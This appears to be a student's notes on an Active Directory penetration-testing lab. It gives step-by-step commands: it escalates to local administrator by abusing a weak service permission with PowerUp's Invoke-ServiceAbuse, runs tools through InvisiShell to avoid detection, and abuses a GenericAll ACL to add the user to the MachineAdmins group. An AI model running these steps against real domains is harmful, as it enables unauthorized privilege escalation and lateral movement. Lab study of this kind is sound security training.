
Task 
• Exploit a service on studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentuserx has local administrative access due to group membership.


Let's use PowerUp from InvisiShell. Remember to run it from a new process and do not use the same one where PowerView is loaded:

```
. C:\AD\Tools\PowerUp.ps1
```

```
Invoke-AllChecks
```

![[Pasted image 20250313212145.png]]

Let’s use the abuse function for the service permission issue and add our current domain user to the local Administrators group.

```
Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx - Verbose
```

![[Pasted image 20250313213101.png]]

After that logoff and Login

Now, we need to identify a machine in the domain where studentuser139 has local administrative access. Usually hunting for local administrator privileges is the way to go. Using PowerView:

```
Find-LocalAdminAccess -Verbose
```

we got no output

Let's enumerate group memberships for studentuserx. The ActiveDirectory module command GetADPrinicpalGroupMemebsrhip does not provide ability to recursively look for group membership. Therefore, we can use the following simple PowerShell code from InvisiShell. Note that the code uses the ActiveDirectory module so that should be imported first:

```powershell
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) { $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) $groups if ($groups.count -gt 0) { foreach ($group in $groups) { Get-ADPrincipalGroupMembershipRecursive $group } } }
```

```
Get-ADPrincipalGroupMembershipRecursive 'studentuser139'
```

![[Pasted image 20250313214025.png]]

Let's check if any of the above groups has interesting ACL entries. After trying for multiple groups, we will find out that us\managers group does have some interesting permissions. Using PowerView from InvisiShell:

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
```

if we have a look at the machineadmins group, its description explains a lot. Using ActiveDirectory module:

![[Pasted image 20250313222137.png]]

Let's add studentuser139 to machineadmins group as we have GenericAll permissions on the group. Using AD module:

```
Add-ADGroupMember -Identity MachineAdmins -Members studentuser139 -Verbose
```

![[Pasted image 20250313222522.png]]

Now, check if we have administrative access to the us-mgmt machine in the Mgmt OU it is the only machine in that OU). Note that we need to clear our existing TGT so that the new group membership is assigned in the new TGT. So, a logoff and logon may be required. We can use winrs for accessing us-mgmt:

![[Pasted image 20250314001822.png]]


